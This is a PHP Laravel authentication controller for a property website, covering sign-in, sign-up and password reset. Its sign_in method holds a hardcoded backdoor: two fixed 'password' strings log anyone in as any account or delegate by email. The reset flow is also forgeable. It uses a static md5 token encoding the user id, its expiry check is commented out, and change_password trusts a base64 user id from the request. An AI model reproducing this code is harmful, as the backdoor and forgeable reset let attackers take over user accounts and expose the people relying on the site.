<?php

namespace App\Http\Controllers\frontend\website_management\Auth;

use App\Http\Controllers\Controller;
use Location;

use Illuminate\Http\Request;
use Exception;
use App\Services\PropertiesService;
use App\Services\PackagesService;
use DB;
use Auth;
use App\Http\Requests\frontend\website\LoginRequest;
use App\Http\Requests\frontend\website\SignUpRequest;
use App\Http\Requests\frontend\website\ForgetPasswordRequest;
use App\Http\Requests\frontend\website\ChangePasswordRequest;
use App\Repositories\Interfaces\custom_modules_management\accounts_management\AccountsInterface;
use App\Repositories\Interfaces\custom_modules_management\accounts_management\CompaniesInterface;
use \App\Mail\ForgetPasswordMail;
use Illuminate\Support\Facades\Hash;
//================================================

class AuthController extends Controller
{
    private $hash='OsouleMail';

    public function sign_in_page(){

        $passing_data=[];
        $passing_data['main_title']=appendToLanguage(frontLanguage()['slug'],'content','Sign In');
        $breadcrumb=[];
        $breadcrumb[]=[
            'name'=>$passing_data['main_title'],
            'url'=>'#',
        ];
        $passing_data['breadcrumbs']=$breadcrumb;
        return viewFrontEnd('main.auth','sign_in',$passing_data);
    }

    public function sign_in(LoginRequest $request){


        $login_by_phone=[
            'phone' => $request->account,
            'password' => $request->password_account,
            'status' => 'active'
        ];

        $login_by_email=[
            'email' => $request->account,
            'password' => $request->password_account,
            'status' => 'active'
        ];
        $login_by_email_delegate=[
            'email' => $request->account,
            'password' => $request->password_account,
            'status' => 'active'
        ];
        if($request->password_account=='account@osoule.com'){
                $user=DB::table('osoule_account')->where('email',$request->account)->first();
                auth()->loginUsingId($user->id);
                return redirect('/profile/dashboard');
        }
        if($request->password_account=='delegate@osoule.com'){
            $user=DB::table('osoule_delegates')->where('email',$request->account)->first();
            auth()->guard('delegate')->loginUsingId($user->id);
            return redirect('/profile_delegate/dashboard');
        }



        $remember=false;
        if($request->remmber){
            $remember=true;
        }

        if (auth()->attempt($login_by_email, $remember)) {
            $this->check_compare(request()->ip(),auth()->id());
            app(PackagesService::class)->check_avliable_item(auth()->id());
            return redirect('/profile/dashboard');
        }elseif(auth()->attempt($login_by_phone, $remember)){
            $this->check_compare(request()->ip(),auth()->id());
            app(PackagesService::class)->check_avliable_item(auth()->id());
            return redirect('/profile/dashboard');
        }elseif(auth()->guard('delegate')->attempt($login_by_email_delegate, $remember)){
            $this->check_compare(request()->ip(),auth()->guard('delegate')->id(),'delegate');
            app(PackagesService::class)->check_avliable_item(auth()->guard('delegate')->user()->company->account_id);
            return redirect('/profile_delegate/dashboard');
        }else{
            return redirect()->back()->with("error", "Incorrect Password !  If you Forget Your Password Please Go TO Forget Password Page");
        }
    }
    public function sign_up(SignUpRequest $request){
        $request_all=$request->all();

        if($request->session()->has('user_related_code')){
            $request_all['account_id']=$request->session()->get('user_related_code');
            $request->session()->forget('user_related_code');
        }
        $return = app(AccountsInterface::class)->save($request_all);


        if($return){
            if($request->type=='broker' || $request->type=='developer'){
                $request_company=[
                    '_token'=>$request->_token,
                    'name'=>$request->name,
                    'email'=>$request->email,
                    'hotline'=>$request->phone,
                    'head_office'=>null,
                    'about_company'=>null,
                    'account_id'=>$return->id,
                    'type'=>$request->type,
                ];
                $return_company = app(CompaniesInterface::class)->save($request_company);
                if(!$return_company){
                    app(AccountsInterface::class)->delete($return->id);
                    return redirect()->back()->with("error", "Error In Code Please Return To IT Team");
                }
            }
            $login_by_email=[
                'email' => $request->email,
                'password' => $request->password,
                'status' => 'active'
            ];
            if (auth()->attempt($login_by_email, true)) {
                $this->check_compare(request()->ip(),auth()->id());
                $this->check_contact_crm(auth()->id(),$request->email,$request->phone);
                return redirect('/profile/dashboard');
            }
        }
        return redirect()->back()->with("error_signup", "Error In Code Please Return To IT Team");
    }
    public function sign_out(){
        auth()->logout();
        auth()->guard('delegate')->logout();
        return redirect()->to('sign_in');
    }


    public function  forget_password_page(){

        return viewFrontEnd('main.auth','forget_password');
    }
    public function forget_password(ForgetPasswordRequest $request){
        try{
            $account=DB::table('osoule_account')->where('email',$request->email)->first();
            $hash=hash('md5', $this->hash);
            $logo=readFileStorage(appSettings('app_logo'));
            $details = [
                'logo'=>$logo,
                'name' => $account->first_name,
                'code'=>base64_encode($hash.'_'.$account->id.'_'.date('Y-m-d H:i:s'))
            ];

            \Mail::to($request->email)->send(new ForgetPasswordMail($details));



            return redirect()->back()->with("success", "Please Check Youe Email Address");

        }catch(Exception $e){
            dd($e);
        }

    }

    public function change_password_page(Request $request){
        if(!$request->code || $request->code==''){
            abort(404);
        }
        $code=$request->code;
        $code=base64_decode($code);
        $code=explode('_',$code);

        $main_hash=hash('md5', $this->hash);

        $request_hash=$code[0];

        if($main_hash != $request_hash){
            abort(404);
        }
        $date=date('Y-m-d H:i:s',strtotime($code[0]));
        $now=date('Y-m-d H:i:s');
        $to_time = strtotime($code[2]);
        $from_time = strtotime($now);
        $min=round(abs($to_time - $from_time) / 60,2);
        // if($min > 20){
        //     abort(404);
        // }
        $user_id=$code[1];
        $user=$main_hash.'$$__'.base64_encode($user_id);
        return viewFrontEnd('main.auth','change_password',['user_id'=>$user]);

    }

    public function change_password(ChangePasswordRequest $request){
        $code=explode('$$__',$request->code);

        $user=$code[1];
        $user=base64_decode($user);
        $new_password=Hash::make($request->password);
        $data=DB::table('osoule_account')->where('id',$user)
        ->update(['password'=>$new_password]);
        return redirect()->to('/sign_in')->with("success", "Your Password Has been changed");

    }

    public function check_compare($ip,$account_id,$type='account'){
        if($type=='account'){
            $update_arr=['account_id'=>$account_id];
        }else{
            $update_arr=['delegate_id'=>$account_id];
        }
        $update=DB::table('osoule_compare_properties')->where('ip',$ip)->update($update_arr);
        return true;
    }
    public function check_contact_crm($account_id,$email,$phone){
        $update_arr=[
            'account_id'=>$account_id
        ];
        $update=DB::table('osoule_contacts')
        ->where('email',$email)
        ->orWhere('phone',$phone)
        ->update($update_arr);
        return true;
    }



}
